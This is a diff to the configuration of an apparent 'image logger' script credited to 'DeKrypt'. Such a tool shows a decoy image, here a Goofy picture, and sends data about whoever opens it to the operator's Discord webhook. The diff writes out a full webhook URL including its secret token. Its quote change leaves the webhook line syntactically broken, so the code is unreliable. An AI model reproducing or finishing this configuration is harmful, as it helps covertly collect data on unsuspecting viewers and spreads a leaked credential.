@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1113254848062820413/V87Q0rOTlSYZ2UHKJVa5ijotaBvzmauZHNiL-VCLpobfbYcTx3TuPhJNbLWQdfh0-l9u",
-    "image": "https://static.wikia.nocookie.net/uberduck/images/e/e5/Goofy.png/revision/latest?cb=20211122010048
+    "webhook": https://discord.com/api/webhooks/1113254848062820413/V87Q0rOTlSYZ2UHKJVa5ijotaBvzmauZHNiL-VCLpobfbYcTx3TuPhJNbLWQdfh0-l9u",
+    "image": "https://static.wikia.nocookie.net/uberduck/images/e/e5/Goofy.png/revision/latest?cb=20211122010048"
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
